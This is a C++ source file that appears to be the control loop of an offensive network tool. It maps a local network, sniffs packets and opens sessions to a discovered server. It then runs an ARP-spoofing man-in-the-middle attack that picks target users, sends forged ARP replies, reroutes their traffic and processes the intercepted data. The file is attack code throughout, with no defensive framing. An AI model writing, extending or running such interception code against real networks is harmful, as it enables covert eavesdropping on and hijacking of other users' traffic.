#include "include/client_runner.h"

void VeryKindClient::boot_system(ClientManager client_manager, RedirecterManager redirecter)
{
    this->net.listInterfaceNames();

    if(this->net.prepared_to_nuke()){
        cout << "[Ready for duty]" << endl;
        while(TRUE){
            hack_the_net(client_manager, redirecter);
        }
        this->net.stop_capture();
        this->net.close_device();
    }
    else{
        cout << "[Failed to openn device]" << endl;
    }
}

void VeryKindClient::hack_the_net(ClientManager client_manager, RedirecterManager redirecter)
{
    this->net.tester();
    while(TRUE) {
        if(this->net.found_server && !this->connected) {
            cout << "Creating sessions" << endl;
            client_manager.create_sessions(this->net.server_ip_address);
            this->net.found_server = false;
            this->connected = TRUE;
            this->net.connected = true;
        }
        if(this->net.spoof_inititiated) {
            //cout << "starting to redirect" << endl;
            redirecter.redirecters_loop();
        }

        if(this->connected){
            cout << "MY LIEGE" << endl;
            client_manager.main_manager_loop();
        }

        nuclear_network();

        if(this->net.spoof_inititiated && !this->start_spoof) {
            decision_maker();
        } else if(!this->net.spoof_inititiated && this->start_spoof) {
            cout << "Spoof stopped momentarily" << endl;
            this->start_spoof = FALSE;
          //  exit(0);
        }
    }
    client_manager.close_sessions();
}

void VeryKindClient::nuclear_network()
{
    thread gods_creations[3];
    if(this->net.spoof_inititiated) {
        if(!this->net.still_capturing()) {
            gods_creations[0] = thread(&GloriousMinion::Change_user_route, &this->net);
            gods_creations[1] = thread(&GloriousMinion::sniffer_spoof, &this->net);
            gods_creations[2] = thread(&GloriousMinion::handle_received_data, &this->net);
        } else {
            gods_creations[0] = thread(&GloriousMinion::Change_user_route, &this->net);
            gods_creations[1] = thread(&GloriousMinion::handle_received_data, &this->net);
            gods_creations[2] = thread(&VeryKindClient::do_nothing, this);
        }
    } else {
        if(!this->net.still_capturing()) {
            gods_creations[0] = thread(&GloriousMinion::Map_The_Net, &this->net);
            gods_creations[1] = thread(&GloriousMinion::sniffer, &this->net);
            gods_creations[2] = thread(&GloriousMinion::handle_received_data, &this->net);
          //  gods_creations[2] = thread(&GloriousMinion::handle_received_data, &this->net);
        } else {
            gods_creations[0] = thread(&GloriousMinion::Map_The_Net, &this->net);
            gods_creations[1] = thread(&GloriousMinion::handle_received_data, &this->net);
          //  gods_creations[1] = thread(&GloriousMinion::handle_received_data, &this->net);
            gods_creations[2] = thread(&VeryKindClient::do_nothing, this);
        }
    }
    for (auto& minion : gods_creations) minion.join();
}

void VeryKindClient::decision_maker()
{
    /** Choose what to do */
    this->net.stop_capture();
    start_spoof_procedure();
}

void VeryKindClient::start_spoof_procedure()
{
    /** Create the packets for the spoof (MITM) */
    /** List users and choose clients */
    cout << "starting spoof procedure" << endl;
    if(this->net.Choose_users() != -1){
        /** Create arp packets for mitm */
        this->net.create_network_arp_replies();
        this->net.create_target_replies();
        cout << "Successfully created packets" << endl;
        this->start_spoof = TRUE;
    }
}

void VeryKindClient::continue_scan()
{
    cout << "Continuing" << endl;
}

void VeryKindClient::restart_scan()
{
    cout << "Restarting" << endl;
    this->net.Restart_Mapping(511);
}

void VeryKindClient::initialize_session(ClientManager client_manager, RedirecterManager redirecter)
{
    boot_system(client_manager, redirecter);
    client_manager.close_sessions();
}
